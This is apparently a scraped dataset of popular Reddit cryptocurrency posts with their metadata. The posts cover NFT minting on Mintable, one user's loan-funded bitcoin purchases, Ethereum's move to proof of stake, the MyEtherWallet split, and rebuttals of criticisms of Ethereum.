creating nfts, no where else can you make so many nfts for so cheap. **gasless minting** you are able to mint directly on mintable's store without needing to submit a single transaction, meaning no transaction fees from the blockchain. this is the best way to get started. you can do it at https://mintable.app/gasless ###minting the nft once you've decided what store your nft will be minted on - the next step is actually minting! *there are a ton of possibilities when minting on mintable, so here is a more in depth breakdown of everything that is happening [creating an item](https://docs.mintable.app/ethereum-version/basics/how-to-create-an-item)* once you click sell - you will be taken to a page to create your listing for your nft and the mint it on the blockchain. **its very similar to listing an item for sale on ebay, etsy, or amazon.** you can create your title, the subtitle, add a description (make it good and tell a story behind your nft!) **uploading your content** mintable has huge file limits, 3gb for the private unlockable file, and 200mb for the preview images. this is great as it means you can upload huge 4k mp4s, high res photos, zip files, or more. **unlockable private file** this file is a private file that only the current owner of the nft can access, so if your selling a video nft, you may upload a low res, short clip as the preview image that anyone can see - but once a buyer purchases your nft, they can download the full, 4k resolution video. **preview images** you then can upload the image for the nft itself, and the preview images for the listing. the first image you upload is the nft image that shows in wallets, and the other images are shown on the listing page. think of it like amazon, the first image is the image people see when browsing amazon, and the other images are the extra images shown when they click on the item page. set your price for the item, select a few other options like transferring copyright or making it non-resellable, and then list it for sale! after your transactions are submitted thats it, you just created an item on the blockchain that you own, you control, and you can sell. congrats! ##more info over time, we will update this to add more info, fix typos, and add new sections. for now, here are some links to where you can learn more about nfts [mintable guides](https://docs.mintable.app/) [nft blog](https://mintable.medium.com) [what are nfts](https://docs.mintable.app/ethereum-version/basics/what-are-nfts) [nft info from opensea](https://opensea.io/blog/guides/non-fungible-tokens/) have questions?

"I Took Out $94,000 in Personal Loans to Buy Crypto: 19 Month Update","not financial advice. greetings all, this is my 19 month update since i first took out an unsecured personal loan to buy bitcoin. you can find my previous updates in my post history. the first is from june 2022. a lot has happened since my last update, so i’ll get right to it… &#x200b; first off, i managed to completely pay off my 2nd loan of $20,000! work has been better than usual and i had a big job in december that netted me a $12,000 windfall of which the entirety was put towards my loan balance. next i decided to buy even more bitcoin by taking advantage of some really awesome credit card balance transfer offers that appeared in august/september… two of my credit cards were offering 0% apr for the first 18 and 21 months with a one time 3% and 5% transfer fee respectively. i also opened a new card that was offering a similar deal and was approved for a $12,000 limit. that combined with my previous two credit card brought my total to $40,000 in balance transfer potential. balance transfer offers are great because they allow you to simply write a check to yourself and cash it in your bank account like any other check. also, i’m only responsible to pay 1% each month, so servicing it is really easy. i ended up using $35,000 in balance transfer loans and buying 1.35 bitcoin at an average price of \~$26,500. this brings my total amount of bitcoin purchased with loans to 4 bitcoin!!!! **with the balance transfer monthly payments, plus the previous loans, my total monthly cost to service all these loans is \~$800.** i can easily afford this. in fact, i’m putting almost double that towards these loans each month to pay them down aggressively so i don’t end up paying a lot of interest when it’s all said and done. i plan to have everything paid off in less than two years. \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* **as of today, of the combined loans / balance transfers i have a total remaining balance of \~$56,000.** it works out like this: $21,000 remaining balance from unsecured personal loan. $35,000 from new balance transfer loans. this brings the total amount of loans that i’ve taken out so far to $94,000. i’ve paid a total of \~$4,500 in interest to date, which brings the total cost basis of these loans to \~$98,500 as of january 24th, 2024. **i have acquired a total of 4 bitcoin at an average price of \~$24,625 per coin: $98,500 / 4 = $24,625.** **as of today, january 25th, 2024, the current price of bitcoin is \~$40,000.** **this brings the total value of the bitcoin i acquired from loans to $160,000.** **this represents an unrealized usd profit of \~$61,500.** the math is simple: $160,000 - $98,500 = $61,500 lastly, i’m officially done taking out loans and balance transfers. i have a nice round number of bitcoin from loans, plus my personal stack which i’ve been slowly adding to from earned income. now it’s time to focus on paying everything down over the next 2 years with earned income. i have no desire to sell my bitcoin regardless of how high its price goes. let me know if you have any questions. not financial advice.",2924,1058,0.84,2024-01-25 18:26:52,web3,CryptoCurrency,Vaginosis-Psychosis,False,2186.0

Why wouldn't Proof of Stake drastically reduce block times vs. Proof of Work?,"i heard that [proof of stake will only reduce block time by \~1 second to 12s](https://blog.ethereum.org/2021/11/29/how-the-merge-impacts-app-layer/). why only 1 second? intuitively, it would seem to me that proof of stake (pos) should be able to drastically reduce block times vs. proof of work since it replaces the computationally expensive pow piece and the arms race nature of everyone mining at the same time with random validator assignment. thus the bottleneck under pos would only be the network latency it takes to propagate the newly created block to the number of validators required for consensus (51%?) + time it takes for those validators to validate/attest that newly created block and propagate their attestation back to everyone else. i don't know what the block propagation latency on ethereum is to reach 51% of nodes, but i can't imagine that being more than a few seconds. i understand that reducing block times too low under proof of work would be offset by increased computational waste and forking (due to everyone mining concurrently and network latency). but wouldn't this problem be eliminated under proof of stake, thus enabling faster block times (and subsequently higher transactions/second)? **(edit: i elaborated on my reasoning in** [**this comment**](https://www.reddit.com/r/ethereum/comments/slzfsd/comment/hvtw4et/?utm_source=reddit&utm_medium=web2x&context=3)**)** is there a detailed explanation/analysis somewhere comparing proof of stake vs. proof of work from a performance standpoint? why is proof of stake only 1 second faster than proof of work? *ps: i don't pretend to deeply understand this stuff, so i'm looking forward to my misconceptions being torn apart.*",3022,230,0.96,2022-02-06 10:33:54,web3,ethereum,JSavageOne,False,1914.8

Why Vitalik Made a 500 IQ Play Today With the 1 Billion Dollars Donation,"if you've been following the news lately, you would see articles written on how vitalik buterin has donated 1 billion dollars with shibacoins he was given. now onto the reasons why this was a really smart move: 1. the end of meme investing and people falling into the pump and dump crypto schemes. vitalik, by donating the shibacoins away, crashed the price immediately after the announcement was made. now onto the reason why ""meme coins"" are bad. meme coins are a shell of a useless erc-20 token that anyone could make in minutes if they were willing to spend $200 upfront. the creators of these tokens then pay influencers on social media apps, pumping up the price; when the price is high enough, they sell, causing a massive crash as everyone runs to the doors to exit their position. ""meme coins"" should be completely purged from the crypto space, i myself take investing to be an extremely serious topic, therefore i believe the cryptocurrency space should be kept for only serious projects that are providing value to society. 2. the second reason why the donation was a smart play is that the country he donated shibacoins to, india, had been planning on banning cryptocurrencies as a whole. with the donation being in an erc-20 token, india would have no choice but to take the money as crypto, therefore improving the chances of the country re-allowing cryptocurrencies for its residents. this is bullish news for the crypto space in general, india being the second most populated country in the world would mean there would be more money being injected into crypto. 3. the third and final reason, which is probably the least important and probably not good news (to miners) is that with the dump of the tokens, gas fees would be lowered. this is good news for all users of ethereum as gas fees were trending at all-time highs the past few days, and with the announcement of the donation this morning, the gas fees have already gone down to around 120 gwei. tldr: with the donation of the shibacoins, vitalik effectively has begun a fight against meme pump and dump coins, began a campaign to re-allow cryptocurrency use in india and lower the transaction gas fees.",2741,456,0.95,2021-05-13 01:19:51,web3,ethereum,[deleted],False,1836.5

Been buying bitcoin every month for 76 months now,"started in october 2017 with the goal of 'enough bitcoin to retire'. got the general idea from the fire community (financial independence, retire early) but instead of buying the s&p every month, i chose to buy bitcoin every month. so, basically i save as much as possible from every salary --> buy as much bitcoin every month as possible. when i have a stack of 1 million euros in fiat terms, i consider myself as successfully retired and most likely gonna quit my job. i document my journey in this blog that i try to update once per month, hopefully you like it interesting and motivating! and whatever your capacity and timing for stacking sats is, i'm pretty sure this kind of 'bitcoin retirement plan' is way more efficient than the government one, so starting anything similar is highly recommended. enjoy reading! ps. doesn't work with shitcoins [https://er-bybitcoin.com/stacking-em-volume-36-january-2024/](https://er-bybitcoin.com/stacking-em-volume-36-january-2024/)",2350,466,0.9,2024-01-27 08:49:54,web3,CryptoCurrency,jamespunk,False,1605.4

Stuff /r/ethereum should know: Proof of Stake edition,"poorly informed crypto-journalist articles are constantly coming out, and this brings more proof-of-stake related questions and discussions rehashing the same topics and same misconceptions. so here are a bunch of common questions/takes i see, boiled down in quick bullet points like i did in [my previous post](https://www.reddit.com/r/ethereum/comments/s8mnwb/a_collection_of_various_things_the_average/) that was more about ethereum in general. i plan on lazily linking this thread whenever i see those points being brought up, and i encourage everyone to do the same and correct me if i got anything wrong or suggest any addition. ## wat merge? a lot more info can be found on [ethmerge.com](https://ethmerge.com/) so i will keep this section light * when the merge happens, ethereum will be secured by proof of stake instead of proof of work. * the merge is not ""eth 2.0"", there is no eth 2.0, [it's an obsolete term.](https://blog.ethereum.org/2022/01/24/the-great-eth2-renaming/) * **if you currently hold eth, you don't need to do anything.** you will still hold the same amount of eth after the merge, there is no ""eth2 coin"", no need to migrate anything, etc. everything sames exactly the same, only the consensus mechanism changes under the hood. * it's called ""merge"" because it's about *merging* the beacon chain (*consensus layer*) with the current chain (*execution layer*) and ditching the proof of work part of the execution layer. * if you don't know, ""consensus"" is just a fancy word for the goal of ordering transactions and getting some economic guarantee that this order won't change. both pow and pos achieve consensus by different means: * pow: ""it costs too much to mess up with the order of blocks, playing by the rules is more lucrative."" * pos: ""it costs too much to mess up with the order of blocks, because if i do i'll lose all the money i put up as collateral."" * since it's only the consensus mechanism changing, **proof of stake by itself will not lower gas fees significantly**. ## why merge? * lower security costs since there's less energy needed to achieve consensus. * for pow you need miners to be able to *at least* cover all the hardware and energy they use otherwise no one will mine. this requires a big issuance that is quickly sold for fiat to pay the bills. * for pos you just need to give some yield to stakers to make people want to deposit capital rather than just invest it elsewhere. no big bills to pay beyond an ordinary computer and an internet connection, so the yield just has to reflect the opportunity costs and risks involved. * more sustainability: * the security of a blockchain is basically proportional to the value of its coin. this is true for both pow (more valuable coin rewards = more reasons to play by the rules = more miners = harder to mess up the consensus) and pos (more valuable staked coins = more reasons to play by the rules to avoid losing the staked coins) * a newly issued coin is essentially value being taken from all holders of the coin and being redistributed to someone. all else equal, selling that coin for fiat extracts value out of the network. * it opens the door for many scaling solutions in the future, namely data sharding, statelessness, light clients, and [more](https://twitter.com/vitalikbuterin/status/1466411377107558402) * it helps reduce some complexity of the code going forward, by separating concerns between execution and consensus. * appeasing the environment and gamers is certainly a nice side-effect, but not really a major reason behind the switch to pos, since it's mostly about externalities over which ethereum as a protocol doesn't have much control (source of energy production, gpu supply chains, etc.) ## wen merge? * it happened on september 15th, 2022 ## nope, your a idiot. they will delay it like they always have in the past. they promised it years ago and still haven't delivered. believe or not this was a common talking point before the merge ## those millions of eth staked will crash the price the very moment they're unlocked lol for sure, there will be plenty of stakers who will want to finally take profit, especially those who locked their eth back when 32 eth was worth $10k. but there's plenty more to consider on the other side of the equation: * the merge doesn't unlock any eth. withdrawals will come in the first hard fork following the merge, likely 6-8 months after. that's months of no proof of work issuance (~13k eth/day) being sold off *and* no proof of stake issuance coming into circulation. * just like how there's a queue to deposit eth, there will be [a queue to withdraw it.](https://github.com/ethereum/annotated-spec/blob/master/phase0/beacon-chain.md#how-does-eth2-proof-of-stake-work). assuming a mass sell-off event, everyone is in that queue, limited at a rate of 1125 valitors per day. so there's no ""opening the floodgates"" moment. everyone unstaking would literally take over a year. a year of ~38k eth/day entering back into circulation (or... roughly 1% of average daily volume) * after the merge, validators will start receiving fee rewards as well, doubling the yield [by some estimates](https://docs.google.com/spreadsheets/d/1vrk5sy5ooq-f8dcyrhmmaj5ytgkvwkwp3ofgcziyxsa/edit#gid=0). there are thousands of people waiting in line to stake *right now*. they're okay with a 5% yield on their eth, i don't think they're gonna yeet the moment it becomes 10% lol * the biggest risk involved in staking is *by far* the merge. something catastrophic could go wrong, yet people have been staking and locking up their eth for over a year despite this risk and despite the eth being locked until an unknown floating date. how many people/institutions are waiting on the sidelines for this risk to disappear before jumping in? * and don't forget stakers exiting means fewer validators which means higher rewards for the stakers who don't exit. it also means more incentives for other people to *start* staking if they weren't before... * but of course it's crypto, and crypto's gonna crypto. the merge will bring excitement and volatility and possibly a sell-the-news dip, who knows. i don't pretend to know the future, but the way i see it it's much more likely way more eth will flow *into* staking than out of it. ## if proof of stake is so good, then how come ethereum didn't go with that from the start? * proof of work is easy to conceptualize and implement, proof of stake isn't. especially when back in 2014 it was mostly a theoretical concept still being researched, with some blockchain implementing some version of it. * there were several fundamental problems with pos that needed to be overcome from a research perspective before thinking about implementing it. * there is no one-size-fits-all for proof of stake. every pos blockchain comes with its own pos specification that has pros and cons on various aspects, so it's not as simple as ""but this other blockchain did it, why can't ethereum just do the same thing"" * starting as a proof of work chain had the benefit of letting anyone mine coins on their own without anyone's permission, which helped the coin distribution become way better than those newer chains that are proof of stake from the start and have to decide how to allocate the initial coins, which can't really be done permissionlessly. * related to above: yes, there was still a premine/presale for ethereum, but it has now been diluted to half the supply after years of mining and multiple bull/bear cycles making that eth swap hands, bringing the distribution [closer to bitcoin's](https://medium.com/@adamscochran/the-10k-audit-42c100dd32bb). so it's not that big of a deal in 2022 when ether as an asset is extremely liquid and easy to acquire. ## nah, this is really just a ploy to screw over the miners one last time after years of hard work * pos has been the eventual goal since [day 1](https://blog.ethereum.org/2014/07/22/launching-the-ether-sale/), everyone mining was always aware that it would end one day. there is no rugpull or unfairness going on here. * economic factors trump any kind of miner-blockchain loyalty. you can kinda view the blockchain as a business and the miners as employees: * miners/employees have been paid for the service they provide (namely, secure consensus) with the block rewards. the paycheck is an expense for the employer and it comes from diluting the value of existing coins from holders (see above in ""why merge?"") * miners go to the chain offering the highest rewards, most of them would ditch ethereum in a heartbeat if another gpu minable coin gave out more rewards. * similarly, ethereum will pay less for the service it requires if stakers can do it for way cheaper. * it's not entirely exclusive. miners can also be holders of the coin, and users of the blockchain. nothing prevents them from holding their rewards and becoming stakers too. ## the coin stops having inherent value if you're not spending real world energy to mine it i don't really buy this argument. there is nothing magical about computing hashes over and over until you land on one that fits arbitrary requirements. i mean, you could have a proof of work blockchain where the work is done by solving sudoku puzzles and it would work exactly the same: np-complete problem, hard to compute one way but easy to verify a solution once one has been found. that doesn't mean solving sudoku inherently brings value into the world. cranking up the mining difficulty of a coin doesn't magically make everyone richer, it just makes mining less profitable – unless of course demand goes up too, which so far hasn't been too much of a problem in the crypto world. the way i see it, the value of a coin ultimately comes from supply and demand, and the demand comes from how valuable the blockspace is. people need eth to buy the blockspace, regardless of whether that eth is generated by a miner or a staker. sure, the more miners there are the higher the security/decentralization which further increases the value proposition of the blockspace in a positive feedback loop, but [feedback loops exist in proof of stake ethereum too](https://i.imgur.com/3bpv35a.png) and they're super cool too! ## proof of stake is a recipe for total centralization * it's basically the same as proof of work but slightly different. ""better"" or ""worse"" really depends on your opinion. the way i see it, pow is really just pos with extra steps. * ethereum as a community values decentralization highly, any potential centralization vector is addressed by the research team to come up with ways to mitigate it, even if it's at the cost of other important stuff like scaling (e.g. keeping gas limits low so more nodes can participate in decentralization, even if that results in congestion and high fees) * there **are** shortcomings currently, decentralization is a spectrum and a process and we're not there yet, and for the time being there are many centralization crutches that need to go away on the long term. that said, none of these crutches represent existential risks for the network, and for practically any ""it's centralized because x"" statement, there is an item on [the roadmap](https://twitter.com/vitalikbuterin/status/1466411377107558402) addressing x. i personally find it much more fascinating to come up with a whole bunch of stuff to solve x rather than give up and say ""it can't be done because of x"". * something interesting about ethereum's pos design that is often overlooked: quadratic penalties. a single validator going down, messing up, or downright attacking the network doesn't get penalized very badly. a thousand validators doing it at the same time get penalized much more heavily. * this means that if you're a megawhale with thousands of validators, it's in your own best interest to spread them out, avoid cloud hosting, use different clients, etc. sure, the capital is still concentrated, but at least the points of failures are distributed which is good for the health of the network overall. * compared to a big mining operation that relies on a central location to amortize costs, which can be spotted from energy usage and shut down if the authorities don't like it. it's hard to move mining equipment across the world, but staking only relies on private/public keys and not any actual hardware beyond a consumer grade computer. ## pos is really just ""who has money makes more money"" * yes. unfortunately we live in a world of high wealth inequality. blockchains don't fix that. * it's also true of proof of work: whoever has money can buy more mining rigs and make more money. except with mining, the roi becomes better with economies of scale: centralized mining operations have the big bucks to get bulk/discount rates on hardware and move to the places with cheap electricity. the solo miner simply can't realistically compete. with proof of stake, everyone earns the same yield proportionally, where they stake $10 or $10m. * ""*they may be centralized, but those big mining operations have no reason to attack the network and weaken it since they dumped millions in infrastructure*""....... so you're saying you're fine with big centralized actors existing, as long as they have some kind of a big *stake* in the network? ## passive interest on your deposit though? printing money out of thin air? that's literally central banks and fiat part 2 electric boogaloo * you have to really stretch it to make this case, but i've seen people do that lol. those takes usually begin with ""proof of stake is nothing new"" * there's still ""work"" being done by validators: creating blocks and validating other blocks. it's just that the work done is composed entirely of the *actually useful work* that the blockchain needs to reach consensus, instead of computing hashes over and over again until one of them meets an arbitrary requirement. * it's not really ""free money being printed out of thin air"", there are still costs involved in staking capital, they're just more abstract and less direct than energy bills: * opportunity costs – why stake at all if another investment offers you a better yield? * illiquidity – from the moment you deposit, your capital is locked up, queued up until your validator is active, then when you withdraw there is yet another queue before getting it back. * inherent risks – it's still a fairly new thing, something could go wrong, there could be a critical bug, network could get attacked, your staking hardware could get compromised, etc. * volatility – at the end of the day it's still a volatile asset, if you're the kind of investor who denominates their investments in their country's fiat currency, then a 5% yield on an asset that can drop 30% overnight isn't all that great (the upside of 5% yield on an asset that doubles is pretty great though, turn that 100% gain into 110%) * maintenance – you still have to maintain and secure your validator, ensure 100% uptime, update software, etc. * here's where it gets nifty: the more stakers there are, the lower the individual rewards get. this basically means that all those costs above will get priced by the market itself. it's easy to see why: if the staking yield is too low, then the rewards don't justify the costs and people will pull out and invest elsewhere, bringing the yield back up. likewise if it's too high, that'll attract more capital and bring it back down. * as far as inflation goes: let's say the market as a whole decides that 5% is the ideal yield, of which 3% comes from issuance. that works out to about 30 million eth staked printing 900 thousand new eth per year. at a total supply of 120 million eth, that's an inflation rate of 0.75%. which is outpaced by eip1559 burn as long as gas fees are at least 23 gwei. (i cannot stress this enough: *ether-the-asset will become a yield-bearing deflationary asset very soon*) * ""*nice math but there's no supply cap + they change the monetary policy all the time*"" * the goal has been ""minimum viable issuance to secure the network"" for years, priorizing network security over an arbitrary supply cap. * no update to the monetary policy has ever increased supply inflation. low inflation rate (specifically *dis*inflation) has been the goal since day 1. * there will be an equilibrium acting as an effective supply cap – decided again by market forces valuing ethereum's blockspace – once the rate of eip1559 burn matches the rate of issuance. that's super nifty if you ask me. * so yeah, there's no ""central ethereum bank"" adjusting rates arbitrarily and printing money to cronies. the market itself dictates how much inflation/deflation there is, no single entity can control it the way a central bank controls fiat inflation rates. ## whales have all the money needed to take over and change the rules and slash honest stakers * no. ethereum has no on-chain governance of any kind for this reason. protocol updates are a community effort (*layer 0*) and you don't need any money staked to call out bad ideas and participate in the process. * this is exactly the same as proof of work: even if you have 99% of the hashpower, you can't make invalid transactions that steal people's money without their private keys, or change protocol rules, or really do anything beyond reorganizing blocks. the 1% of honest nodes will reject any block that don't follow the rules and you'll be mining on an invalid/useless chain. now replace hashpower/mining with stake/staking and the same holds true for proof of stake (with the difference that someone caught reorganizing blocks will have their entire stake destroyed, whereas the blockchain can't exactly destroy mining rigs) * and simply put, there is a fuckton of eth involved. 10 million and counting and that's *before the merge*. at current prices that's roughly 30 billion dollars. both ""amount of eth staked"" and ""value of eth"" are projected to go up, so attacks become increasingly unlikely due to the sheer economic cost involved in doing an attack — *once* — and the absurdity of acquiring that much eth in the first place if the attack comes from an outside actor (where would you buy 10 million eth to have 51% of the stake? 20m?) ## 32 eth is way too much, the average person doesn't have that much * i agree it's a lot. there are some ideas of how it could be lowered ([better signature aggregation](https://www.reddit.com/r/ethereum/comments/rwojtk/ama_we_are_the_efs_research_team_pt_7_07_january/hrmt6o0/) or [a rotating cap of active validators](https://ethresear.ch/t/simplified-active-validator-cap-and-rotation-proposal/9022)) but they don't seem to be very high on the priority list currently, as opposed to making sure the base layer is truly secure. * the reason for such a high number is it has to fall in a technical sweetspot. in a nutshell, it has to be low enough to be accessible and have enough validators to secure the chain, but high enough to not have too many validators and bloat the chain with overhead. and having a fixed amount for each validator reduces a lot of the complexity by having each validator weighted exactly the same in the distributed randomness process of who gets to produce each block. * there is a whole bunch of [math involved](https://thomasborgers.medium.com/ethereum-2-0-economic-review-1fc4a9b8c2d9) to arrive at 32 eth from a technical standpoint, back when 32 eth was worth about 7000 usd. [earlier math from 2017](https://medium.com/@vitalikbuterin/parametrizing-casper-the-decentralization-finality-time-overhead-tradeoff-3f2011672735) even suggested over 1000 eth minimum. * thankfully, just like mining pools exist, there are staking pools to allow staking in smaller amounts. it doesn't necessarily fly in the face of the ""not your keys not your coins"" mantra, thanks to things like [rocketpool](https://rocketpool.net/), [secret shared validators](https://medium.com/coinmonks/secret-shared-validators-on-ethereum-2-0-ea29ab380016) (not yet launched) which use smart contracts to be permissionless, decentralized and non-custodian. and because of the quadratic penalties mentioned above, i believe decentralized staking operations will outperform the centralized ones on the long run. i recommend superphiz's [guide to staking](https://www.reddit.com/r/ethstaker/comments/t1xpr5/how_to_stake_on_ethereum_march_2022_edition/) for more info. and obviously, i admit staking through exchanges is yucky if you value decentralization * related to above, stuff like rocket pool is better viewed as a higher-level abstraction to base staking, rather than ""just a staking pool"". i go into more details on this [here](https://www.reddit.com/r/ethereum/comments/tijcq1/stuff_rethereum_should_know_proof_of_stake_edition/i1gd27b/?context=1) for those interested. ## pos hasn't been proven, while we know pow works that's actually totally fair and there is no real rebuttal to this, obviously. only time will tell. i just think it's irrelevant in the context that ethereum *is* switching to pos and was always going to. if you don't believe in it, don't participate/invest in it. i do personally believe in a long term sustainable pos ethereum, but even then i'm glad good ol' boring-by-design bitcoin will be there chugging its proof of work along. it's all part of the great crypto experiment of our lifetime. either it's just a fad and will fail into obscurity, which would be a bummer for sure, or we'll have succeeded in creating monster robust networks capable of outlasting humanity. to achieve that, prioritizing decentralization is key. which is something i mainly just see in bitcoin and ethereum, despite the widely different philosophies. it's why i'm glad to have both to truly see what's what on the long term. ## i have more questions idk ask them in the comments, i'm sure i forgot stuff. but plz be polite",1457,1312,0.98,2022-03-20 07:49:19,web3,ethereum,domotheus,False,1408.8

Buying/holding ETH is a bigger F*ck you to Wall Street than holding $GME,"i understand the passion and purpose of buying and holding $gme. i get it. i really do. we make the hedge funds bleed out. but to me, this whole cluster f*ck with robinhood and $gme has blatantly exposed 2 problems with the traditional finance system that ethereum solves. i understand there are different narratives as to what is happening with robinhood so i will address both narratives because ethereum solves them both. narrative 1: robinhood/brokerages banned buying to make $gme crash to protect the hedge funds. solution: ethereum solves this with decentralized exchanges like uniswap. something as absurd as banning buying could never happen on a dex. narrative 2: robinhood/brokerages temporarily suspended buying because the clearing firms raised their requirement for reserves to 100% for the shares of $gme during settlement (takes 2-3 days) solution: ethereum solves this by settling transactions in minutes, not days. we need to be pushing harder on marketing this. if the entire r/wallstreetbets community realized how big of an opportunity ethereum is to take down the assholes in suits, having that momentum behind us thrusting ethereum’s use cases into the spotlight would overthrow the shitty centralized system in a very short amount of time.",1974,380,0.9,2021-01-30 18:30:13,web3,ethereum,drunkPrisonSquirrel,False,1345.3999999999999

Official MyEtherWallet Statement,"official statement regarding yesterdays' events and status of [myetherwallet](https://www.myetherwallet.com) hello everyone, by now, you may have already read the article at [medium](https://medium.com/mycrypto/mycrypto-launch-6a066bf41093). for those of you who do not know me, i founded myetherwallet (“mew”), and i believe that i owe our ethereum community, and the crypto community at large, an explanation of yesterday’s events. before i do, a brief history about me: i’ve been intrigued by ethereum ever since the release of their yellow paper back in 2014. upon reading it, i realized that vitalik was a true visionary and became infatuated with the technology behind ethereum. specifically, i understood all the transformative possibilities that this type of technology presented now and in the future. when the ethereum foundation released the “mainnet,” however, i recognized that many users were struggling. with no graphical user interface, many early adopters were having difficulty accessing and transferring their ether. i saw an opportunity to contribute to this new, emerging community, and seized it. i began working on a user interface to be used in conjunction with, and in support of, ethereum wallet functionality that any new crypto adopter could feel comfortable using. i released my initial version, and published it on [reddit](https://www.reddit.com/r/ethereum/comments/3gkknd/ether_wallet_generator_for_now/) on august 11, 2015 (mew’s birthday!). i designed it to be open source so that others like me could make modifications to my existing codebase, and continue improving user-friendliness and functionality over time. however, as a core developer and programmer, business development/designing were, admittedly, not my strength. i needed someone to take the lead on that front if i wanted mew to grow its userbase. i brought my friend, taylor m., on board knowing that she was up to the task. let’s just say that she did not disappoint, and mew took off much faster than either of us could have anticipated. i will always be appreciative of her efforts in helping mew achieve the success it did. alas, for reasons i cannot delve into here, our partnership had to end. during the transition yesterday, however, mew’s twitter account was switched from @myetherwallet to @mycrypto, and tens of thousands of mew followers were left scratching their heads. indeed, the change was unexpected, and i’m still in the process of determining the justification behind the switch, and how this issue will be resolved. i don’t know what the fall out from this will be ultimately, but i will not be on the offensive or defensive discussing the circumstances surrounding our decision to separate beyond my statement here. instead, my focus will be (as it’s always been) on how best to improve mew for existing and prospective users. security is paramount these days, and me and my new team will remain vigilant in ensuring that the mew website, your accounts, and more importantly, your ether and tokens, are safe. rest-assured that mew is the same product that you trusted yesterday, and the mew team will work tirelessly to make sure it is the product you still trust tomorrow. the ethereum community inspired me to create myetherwallet, and it still inspires me today. i am not going anywhere. furthermore, for those of you wondering where i’ve been or what i’ve been working on the past several months, i’ve been busy doing what i do best—so get ready for some new and exciting products/services in the pipeline. stay tuned! in any event, i must admit that competition is a good thing because it serves as a driving force behind innovation. look at the world around us. complacency simply means one will get left behind. that being said, i sincerely wish taylor m. and mycrypto the very best. your presence in the crypto space will undoubtedly motivate me to continue raising the bar. thank you all for your support over the last few years, and hopefully, in the years to come. mew’s team remains committed to you, and is available to answer any and all questions or concerns you may have. truly yours, kosala h. kvhnuke",1596,697,0.92,2018-02-09 16:10:15,web3,ethereum,kvhnuke,False,1245.6

Addressing common criticisms about Ethereum,"here goes, a list of common criticisms for ethereum, and my personal opinion on each of them. this space is rife with misinformation, fud and downright lies, i hope this encourages people to think critically and find accurate information for themselves. if you have more questions, feel free to comment. if you disagree, that's fine, i have expressed my opinion. i will, of course, revise my opinion for factual errors or oversights. everything in this post is public domain, feel free to share it with anyone in parts or in entirety, cross-post them, riff on them etc. i don't need any credit - i just want to do my part in quelling the rampant balderdash that pervades this space. (ps: i tried posting this in r/cc and r/ethereum and as expected, they were removed. so if you know what's required to get such a post approved, please feel free to repost.) special shoutout to r/ethfinance folks for contributing questions. # ethereum can't scale this is demonstrably false because there are multiple rollups currently online, some of which have been running for a year now! here are some examples that you can use today: loopring, zksync, deversifi, hermez, aztec, dydx, immutable x etc. most of these projects can process thousands of tps with such low gas fees that some of them subsidize it (or abstract it away from ux), so the users effectively pay zero gas. what's missing are generalized programmable rollups. optimism has been live on mainnet since january, but is currently restricted to only synthetix. uniswap v3 is the next major release on optimism, before finally opening it up for public smart contract deployment in july or later. by the way, optimism have done a *terrible* job with communications this year - criticism is certainly due here. engineering-focused project or not, communications & public relations are always important. but optimism is just one solution. other solutions like zksync 2.0, arbitrum and starknet will be rolling out over the course of the year, and we have more like omgx and cartesi joining the fray. indeed, it now seems likely arbitrum will be publicly available ahead of optimism. not to mention sidechains or commitchains like polygon or xdai, or other evm chains like bsc or avalanche. ultimately, all of these are part of the extended ethereum ecosystem. at the same time, this is also partially true. i will note that ethereum l1 gas fees will likely remain high forever, short of some exotic technology that doesn't yet exist. even on rollups, you're not going to get dirt cheap fees until data sharding is released, which is a couple of years away, and even that won't be enough long term. and that's just fine... there's simply overwhelming demand for evm blockspace. related: [opinion: rollups are 4th gen blockchains : cryptocurrency (reddit.com)](https://www.reddit.com/r/cryptocurrency/comments/my0h9s/opinion_rollups_are_4th_gen_blockchains/) # high gas fees will kill ethereum this is one of those bizarre comments that pervades through crypto retail doesn't seem to make any sense. overwhelming demand for a product will somehow... kill a project? it's like saying amd and nvidia are going to die soon because graphics cards are now grotesquely overpriced. no, the reality, like i said above, is that there's overwhelming demand for evm blockspace and a limited supply of gas. currently, the high fees shows there's incredible demand for ethereum l1 blockspace, and people are willing to pay a steep premium for it. **this is what gives the ethereum network and eth value. and in two months' time, there'll be a mechanism with eip-1559 to accrue this value to every eth stakeholder.** over time, we will see gas fees drop with a greater supply of gas - the reality is that there'll never quite be enough blockspace supply to satisfy global demand for evm blockspace long term. there'll be rollups, there'll be hybrid solutions like zkporter/validium, there'll be sidechains/alternate chains, and there'll be centralized solutions. the ecosystem will work together to offer different trade-offs with decentralization versus transaction fees. # ethereum is centralized, all decisions are made by vitalik while vitalik remains an important part of the ethereum ecosystem, ethereum development has become sufficiently decentralized over time. unique to ethereum is a multi-client approach, where researchers work with developers to create plain text specifications. these specifications are then implemented by multiple client developers who work independently. this is different to all other blockchain projects where the core team develops a single client. now, of course, there are arguments for a single client - putting all resources into one client could make for a higher quality client than 4 or 5 not-as-high-quality client, but this is clearly the most decentralized approach. for example, there are currently 4 consensus layer clients in production, and 1 more in development - all developed by teams independent of the ethereum foundation (apart from receiving grants). for any consensus forks, these 5 development teams have to agree on upgrades, and then 135,000+ validators do as well. this is not how a centralized network functions. not to mention ethereum's strong ""layer 0"" that all developers and validators listen to intently - its community. for example, eip-1559 has been significantly motivated by the will of the community. # ethereum was premined. ethereum is controlled by vitalik. (u/aaqy, u/ec265) i'm not a fan of icos, and ethereum certainly did have one. i don't like ninja mining either, like bitcoin. we have seen some defi projects have fair launches with airdrops to users, and this is certainly the best way to distribute tokens. however, it's important to understand the context - back in 2014 this was simply the fairest way to raise funding. at genesis, ethereum foundation held \~12m eth. however, over the years, this has been distributed - a lot of it seems to be fundraising in the early years. currently ethereum foundation and early developers hold \~2% of the supply at most. vitalik owns 0.3% of all eth. contrast this with other projects where the founders often hold 20% or more, public corporations like tesla or amazon with a similar amount, or satoshi holding 5% of all btc. (was as high as 50+% in 2009/10, and yes, they are assumed lost and not comparable anyway.) i would even go ahead and say that 0.3% is absolutely not enough to adequately incentivize a founder to keep working on the project! would i have preferred to see ethereum do a fairer launch? sure. but today, in the here and now, ethereum has the fairest distribution among founders of any project. # mining is destroying the environment while there are nuances to do this, this one's actually true to an extent - mining is highly inefficient. fortunately, ethereum is moving to proof-of-stake within the next 9 months, which will cut ethereum's energy consumption by 99+%. it's not just about electricity either. we know there's a significant global shortage for semiconductors right now. a lot of tsmc's limited wafer supply currently being used to fabricate mining-related silicon (asics, gpus) can be reallocated towards cpus, asics and 